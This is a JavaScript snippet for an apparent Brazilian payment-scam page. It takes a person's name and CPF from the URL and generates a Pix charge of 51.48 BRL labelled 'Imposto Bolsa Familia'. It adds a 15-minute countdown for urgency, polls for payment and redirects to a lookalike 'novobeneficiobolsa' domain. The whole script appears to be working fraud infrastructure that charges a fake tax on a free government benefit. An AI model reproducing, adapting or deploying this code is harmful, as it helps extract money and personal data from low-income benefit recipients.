<script>
  let pixJaGerado = false;

  function getParam(name) {
    const url = new URL(window.location.href);
    return url.searchParams.get(name) || '';
  }

  function copiarPix() {
    const codigo = document.getElementById('pixCode').innerText;
    navigator.clipboard.writeText(codigo).then(() => {
      alert("Código Pix copiado!");
    });
  }

  let tempo = 15 * 60;
  const contador = setInterval(() => {
    const minutos = String(Math.floor(tempo / 60)).padStart(2, '0');
    const segundos = String(tempo % 60).padStart(2, '0');
    document.getElementById("tempoRestante").innerText = `${minutos}:${segundos}`;
    tempo--;
    if (tempo < 0) clearInterval(contador);
  }, 1000);

  const checarStatus = async (id) => {
    const res = await fetch(`/pix-status?id=${id}`);
    const data = await res.json();
    if (data.status === "PAID") {
      clearInterval(verificador);
      window.location.href = "https://novobeneficiobolsa.com.br/inicio/bolsa-up1/";
    }
  };

  let verificador;
  async function gerarPix() {
    if (pixJaGerado) return;
    pixJaGerado = true;

    const nome = decodeURIComponent(getParam('nome') || 'Cliente Teste');
    const cpf = getParam('cpf') || '00000000000';

    document.getElementById('nomeCliente').innerText = nome;
    document.getElementById('cpfCliente').innerText = cpf;

    const body = {
      identifier: "81xy74ektq",
      amount: 51.48,
      client: {
        name: nome,
        email: "default@email.com",
        phone: "(11) 99999-9999",
        document: cpf
      },
      products: [
        {
          id: "cmabolds900uzw7u9odlkozbn",
          name: "Imposto Bolsa Familia",
          quantity: 1,
          price: 51.48
        }
      ],
      dueDate: new Date(Date.now() + 10 * 60 * 1000).toISOString().split('.')[0] + 'Z',
      metadata: {
        origem: "automatica"
      },
      callbackUrl: "https://minha.api.com/pix/callback/ho5a2y9cdm"
    };

    const res = await fetch('/pix-duckfy', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body)
    });

    const data = await res.json();
    if (data.pix) {
      let src = data.pix.base64;
      if (!src.startsWith("data:image")) {
        src = `data:image/png;base64,${src}`;
      }
      document.getElementById('qrCode').innerHTML = `<img src="${src}" alt="QR Code Pix" />`;
      document.getElementById('pixCode').innerText = data.pix.code || "Código não disponível";
      verificador = setInterval(() => checarStatus(data.transactionId || ""), 10000);
    }
  }

  // Executa a função apenas uma vez quando a página estiver pronta
  window.addEventListener('DOMContentLoaded', gerarPix);
</script>
